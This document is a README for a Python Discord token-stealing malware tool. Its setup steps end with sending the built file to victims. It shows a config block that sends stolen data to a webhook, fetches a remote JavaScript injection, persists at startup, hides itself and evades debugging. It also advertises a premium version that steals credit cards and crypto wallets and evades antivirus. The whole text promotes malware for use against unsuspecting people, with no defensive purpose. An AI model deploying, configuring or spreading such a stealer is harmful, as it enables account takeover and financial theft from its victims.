## <a id="setup"></a> 📁 〢 Setting up Hazard Token Grabber.V3

1. Install [python](https://www.python.org/) and add it to [path](https://datatofish.com/add-python-to-windows-path/).
2. Open up [main.py](https://github.com/Rdmo1/Hazard-Token-Grabber-V3/blob/master/main.py) with notepad or some other editor
3. Locate the config at the top of the file and Replace "WEBHOOK_HERE" with your [discord webhook](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks)
4. Double Click `setup.bat` and allow it to finish.
5. A Window will open prompting for a name. Put something in such as "Token_Logger" (You can always rename the file later)
6. Send the file to victims. 😈

## <a id="config"></a>⚙ 〢 Config

If you want to change the config, open up [main.py](https://github.com/Rdmo1/Hazard-Token-Grabber-V3/blob/master/main.py) and locate it at the top. There you can configure the following:

```py
config = {
    # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdmo1/Discord-Webhook-Protector
    # Recommend using https://github.com/Rdmo1/Discord-Webhook-Protector so your webhook can't be spammed or deleted
    'webhook': "WEBHOOK_HERE",
    # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdmo1/Discord-Webhook-Protector
    'webhook_protector_key': "KEY_HERE",
    # keep it as it is unless you want to have a custom one
    'injection_url': "https://raw.githubusercontent.com/Rdmo1/Discord-Injection/master/injection.js",
    # if True, it will ping @everyone when someone ran Hazard V3
    'ping_on_run': False,
    # set to False if you don't want it to kill programs such as discord upon running the exe
    'kill_processes': True,
    # if you want the file to run at startup
    'startup': True,
    # if you want the file to hide itself after run
    'hide_self': True,
    # does it's best to prevent the program from being debugged and drastically reduces the changes of your webhook being found
    'anti_debug': True,
    # this list of programs will be killed if hazard detects that any of these are running, you can add more if you want
    'blackListedPrograms':
    [
      ...
    ]

}
```

## <a id="why_hazard"></a>🔎 〢 Why choose Hazard V3?

You might be wondering, Why choose this grabber instead of other ones like [Mercurial](https://github.com/NightfallGT/Mercurial-Grabber) or [ItroublveTSC](https://github.com/Itroublve/ItroublveTSC). Without making this a competition Hazard V3 has many advantages over alot of grabbers out there, popular, free and even paid ones. V3 is well maintained and updates gets pushed out on a regular basis making it a non-buggy, clean, and working grabber. V3 was for example the first grabber to bypass and decrypt discords new token encryption and additionally has a [injection](https://github.com/Rdmo1/Discord-Injection) which also currently is the only working one.

Here are some pros and cons why/why not use Hazard V3 instead of other ones

### ✔ Pros

⁃ Extremely well maintained, making it a safe choice \
⁃ Partly undetected just because it gets updates often \
⁃ Easy to use and setup \
⁃ Completely free and open source \
⁃ Loads of wide spread features not only focused on discord \
⁃ Cleans itself up, deleting all traces of itself which suprisingly most others don't \
⁃ Supports a webhook protector I made ([Discord-Webhook-Protector](https://github.com/Rdmo1/Discord-Webhook-Protector)) making it impossible to delete your webhook \
⁃ Even thought it's made in python it's very fast thanks to async and threading \
⁃ Clean embed & isn't spammy like others making it less likely to get ratelimited \
⁃ Takes feedback and listens to what people want to be added/changed/removed

### ❌ Cons

⁃ Made in Python making it lose to other grabbers in terms of speed \
⁃ Python is an interpreted language, it needs to pack the engine & all dependencies making the file size very big \
⁃ Only supports windows 10/11 \
⁃ Can be pretty easily decompiled (still harder than Mercurial atleast)

In the end it's just up to **you** to choose what grabber suits you and your needs the best.

## <a id="premium"></a>💎 〢 Premium

Hazard V3 is a free software. It will **NOT** be undetected from antiviruses, or have custom features such as:

- Stealing from more browsers (edge, firefox, brave, opera etc..)
- Stealing creditcards, addresses, emails, phone numbers, names etc..
- Crypto/Wallet stealing
- Undetected from antivirus
- Obfuscated to a irreversible point
- Made in a compiled language (stealers made in python automatically becomes bad)
- Multi os support
- Loads more

Currently the premium grabber is not out yet, but the goal is that the premium one will be a cheap but powerfull grabber and will have the features listed above 10x.
join [cheataway](https://cheataway.com/invite) and do `!buy` to see preview of the grabber, free trial will be available so you can try it out and see if you like it.
